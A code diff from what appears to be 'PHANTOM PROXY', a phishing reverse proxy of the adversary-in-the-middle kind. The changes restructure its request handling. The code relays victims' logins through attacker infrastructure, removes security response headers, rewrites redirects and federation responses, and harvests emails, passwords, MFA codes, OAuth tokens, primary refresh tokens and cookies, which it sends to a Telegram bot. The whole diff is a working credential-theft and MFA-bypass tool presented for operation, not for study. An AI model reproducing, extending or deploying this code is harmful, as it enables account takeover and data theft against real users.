+                               res.end(JSON.stringify(validDomains));
+                               return;
+                           }
+                       }
+                       proxyRequestProtocol = proxyRequestURL.protocol || 'https:';
+                       proxyRequestOptions.path = proxyRequestPath;
+                       proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
+                       proxyRequestOptions.method = parsed.method;
+                       proxyRequestOptions.headers = { ...req.headers, ...parsed.headers };
+                       if (proxyRequestURL.hostname !== req.headers.host) {
+                           proxyRequestOptions.hostname = proxyRequestURL.hostname;
+                           proxyRequestOptions.headers.host = proxyRequestURL.host;
+                       }
+                       if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
+                       isNavigationRequest = parsed.mode === "navigate";
+                       clientRequestBody = parsed.body;
+                   } catch (error) {
+                       displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
+                   }
+               }
+           }
 
-                if (clientRequestBody) {
-                    if (url === PROXY_PATHNAMES.jsCookie) {
-                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
-                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                        clientResponse.end(JSON.stringify(validDomains));
-                        return;
-                    } else if (url === PROXY_PATHNAMES.proxy) {
-                        try {
-                            const parsed = JSON.parse(clientRequestBody);
-                            let proxyRequestURL = new URL(parsed.url);
-                            let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
+           if (url !== PROXY_PATHNAMES.proxy && !url.startsWith(PROXY_ENTRY_POINT)) {
+               proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(req.headers.host, VICTIM_SESSIONS[currentSession].host);
+           }
+           updateProxyRequestHeaders(proxyRequestOptions, currentSession, req.headers.host);
 
-                            if (proxyRequestURL.hostname === headers.host) {
-                                if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
-                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
-                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
-                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
-                                    VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
-                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
-                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
-                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
-                                    clientResponse.end();
-                                    return;
-                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
-                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
-                                    return;
-                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
-                                    try {
-                                        const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
-                                        proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
-                                        proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
-                                    } catch (error) {
-                                        displayError("Mutation parse failed", error, proxyRequestPath);
-                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
-                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-                                        return;
-                                    }
-                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
-                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
-                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
-                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
-                                    clientResponse.end(JSON.stringify(validDomains));
-                                    return;
-                                }
-                            }
-                            proxyRequestProtocol = proxyRequestURL.protocol;
-                            proxyRequestOptions.path = proxyRequestPath;
-                            proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
-                            proxyRequestOptions.method = parsed.method;
-                            proxyRequestOptions.headers = { ...headers, ...parsed.headers };
-                            if (proxyRequestURL.hostname !== headers.host) {
-                                proxyRequestOptions.hostname = proxyRequestURL.hostname;
-                                proxyRequestOptions.headers.host = proxyRequestURL.host;
-                            }
-                            if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
-                            isNavigationRequest = parsed.mode === "navigate";
-                            clientRequestBody = parsed.body;
-                        } catch (error) {
-                            displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
-                        }
-                    } else {
-                        console.warn(`Non-proxied URL: ${url}`);
-                    }
-                } else {
-                    console.warn(`No request body for URL: ${url}`);
-                }
+           const proxyRequestBody = clientRequestBody;
+           const contentLength = Buffer.byteLength(proxyRequestBody);
+           if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
+           else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }
 
-                proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
-                updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);
+           if (isNavigationRequest) {
+               VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
+               VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
+               VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
+               VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
+               VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
+           }
 
-                const proxyRequestBody = clientRequestBody.body || clientRequestBody;
-                const contentLength = Buffer.byteLength(proxyRequestBody);
-                if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
-                else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }
+           const protocol = proxyRequestProtocol === "https:" ? https : http;
+           const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
+               if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
+                   const location = proxyResponse.headers.location;
+                   try {
+                       const locationURL = new URL(location);
+                       VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol || 'https:';
+                       VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+                       VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
+                       VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
+                       VICTIM_SESSIONS[currentSession].host = locationURL.host;
+                       proxyResponse.headers.location = location.replace(locationURL.host, req.headers.host);
+                       console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
+                   } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
+               }
 
-                if (isNavigationRequest) {
-                    VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
-                    VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
-                    VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
-                    VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
-                    VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
-                }
+               const setCookieHeaders = proxyResponse.headers["set-cookie"];
+               if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, req.headers.host, currentSession, proxyResponse.headers.date);
+               proxyResponse.headers["cache-control"] = "no-store";
+               proxyResponse.headers["access-control-allow-origin"] = `https://${req.headers.host}`;
+               deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
 
-                const protocol = proxyRequestProtocol === "https:" ? https : http;
-                const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
-                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
-                        const location = proxyResponse.headers.location;
-                        try {
-                            const locationURL = new URL(location);
-                            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-                            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-                            VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
-                            VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
-                            VICTIM_SESSIONS[currentSession].host = locationURL.host;
-                            proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
-                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
-                        } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
-                    }
+               let responseBody = [];
+               proxyResponse.on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
+                           .on("data", (chunk) => responseBody.push(chunk))
+                           .on("end", async () => {
+                               let bodyBuffer = Buffer.concat(responseBody);
 
-                    const setCookieHeaders = proxyResponse.headers["set-cookie"];
-                    if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
-                    proxyResponse.headers["cache-control"] = "no-store";
-                    proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
-                    deleteHTTPSecurityResponseHeaders(proxyResponse.headers);
+                               let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
+                               try {
+                                   let reqBody = proxyRequestBody;
+                                   if (typeof reqBody === 'string') {
+                                       try {
+                                           const parsed = JSON.parse(reqBody);
+                                           if (parsed.email) email = parsed.email;
+                                           if (parsed.password) password = parsed.password;
+                                           if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
+                                           if (parsed.access_token) tokens.access_token = parsed.access_token;
+                                           if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
+                                           if (parsed.id_token) tokens.id_token = parsed.id_token;
+                                           if (parsed.prt) tokens.prt = parsed.prt;
+                                       } catch (e) {}
+                                   }
+                                   const respStr = bodyBuffer.toString('utf-8');
+                                   const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                   if (am) tokens.access_token = am[1];
+                                   const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                   if (rm) tokens.refresh_token = rm[1];
+                                   const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                   if (im) tokens.id_token = im[1];
+                                   const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
+                                   if (pm) tokens.prt = pm[1];
+                                   const setCookies = proxyResponse.headers['set-cookie'];
+                                   if (setCookies) {
+                                       const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
+                                       for (const c of arr) {
+                                           const [nameVal] = c.split(';');
+                                           if (nameVal) {
+                                               const [n, v] = nameVal.split('=');
+                                               cookies[n] = v;
+                                           }
+                                       }
+                                   }
+                                   if (VICTIM_SESSIONS[currentSession]) {
+                                       if (VICTIM_SESSIONS[currentSession].email && VICTIM_SESSIONS[currentSession].email !== 'N/A') email = VICTIM_SESSIONS[currentSession].email;
+                                       if (VICTIM_SESSIONS[currentSession].password && VICTIM_SESSIONS[currentSession].password !== 'N/A') password = VICTIM_SESSIONS[currentSession].password;
+                                       if (VICTIM_SESSIONS[currentSession].mfa && VICTIM_SESSIONS[currentSession].mfa !== 'N/A') mfa = VICTIM_SESSIONS[currentSession].mfa;
+                                   }
+                                   if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
+                                       await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
+                                   }
+                               } catch (e) {}
 
-                    let responseBody = [];
-                    proxyResponse
-                        .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
-                        .on("data", (chunk) => responseBody.push(chunk))
-                        .on("end", async () => {
-                            let bodyBuffer = Buffer.concat(responseBody);
+                               if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
+                                   try {
+                                       const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
+                                       bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
+                                       bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
+                                       if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
+                                   } catch (error) {
+                                       displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
+                                   }
+                               } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
+                                   try {
+                                       const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
+                                       bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, req.headers.host);
+                                       bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
+                                       if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
+                                   } catch (error) {
+                                       displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
+                                   }
+                               }
 
-                            let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
-                            try {
-                                let reqBody = proxyRequestBody;
-                                if (typeof reqBody === 'string') {
-                                    try {
-                                        const parsed = JSON.parse(reqBody);
-                                        if (parsed.email) email = parsed.email;
-                                        if (parsed.password) password = parsed.password;
-                                        if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
-                                        if (parsed.access_token) tokens.access_token = parsed.access_token;
-                                        if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
-                                        if (parsed.id_token) tokens.id_token = parsed.id_token;
-                                        if (parsed.prt) tokens.prt = parsed.prt;
-                                    } catch (e) {}
-                                }
-                                const respStr = bodyBuffer.toString('utf-8');
-                                const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
-                                if (am) tokens.access_token = am[1];
-                                const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
-                                if (rm) tokens.refresh_token = rm[1];
-                                const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
-                                if (im) tokens.id_token = im[1];
-                                const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
-                                if (pm) tokens.prt = pm[1];
-                                const setCookies = proxyResponse.headers['set-cookie'];
-                                if (setCookies) {
-                                    const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
-                                    for (const c of arr) {
-                                        const [nameVal] = c.split(';');
-                                        if (nameVal) {
-                                            const [n, v] = nameVal.split('=');
-                                            cookies[n] = v;
-                                        }
-                                    }
-                                }
-                                if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
-                                    await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
-                                }
-                            } catch (e) {}
+                               await logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession);
 
-                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
-                                try {
-                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
-                                    bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
-                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
-                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
-                                } catch (error) {
-                                    displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
-                                }
-                            } else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
-                                try {
-                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
-                                    bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
-                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
-                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
-                                } catch (error) {
-                                    displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
-                                }
-                            }
+                               res.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                               res.end(bodyBuffer);
+                           });
+           });
 
-                            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
-                            clientResponse.end(bodyBuffer);
-                        });
-                });
-
-                if (proxyRequestBody) proxyReq.write(proxyRequestBody);
-                proxyReq.end();
-            });
-    } else {
-        clientResponse.writeHead(301, { Location: REDIRECT_URL });
-        clientResponse.end();
-    }
+           if (proxyRequestBody) proxyReq.write(proxyRequestBody);
+           proxyReq.end();
+       });
 });
 
 // ============================================================
@@ -2283,11 +2310,11 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 // ============================================================
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.1 ULTIMATE running on port ${PORT}`);
-    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
-    console.log(`📱 Device Code: /device`);
+    console.log(`✅ PHANTOM PROXY v10.3 ULTIMATE running on port ${PORT}`);
+    console.log(`🔐 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
+    console.log(`📱 Device Code: http://localhost:${PORT}/device`);
     console.log(`🔄 Redirect interception: ACTIVE`);
-    console.log(`📤 Telegram exfil: ACTIVE`);
+    console.log(`📤 Telegram exfil: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
@@ -2295,5 +2322,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🎭 Phishlets: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`📥 Credential Capture: ACTIVE (with MFA support)`);
-    console.log(`✅ All features integrated — NO Express!`);
+    console.log(`✅ All features integrated — SINGLE SERVER architecture!`);
 });
+
+refreshTokensDaemon();
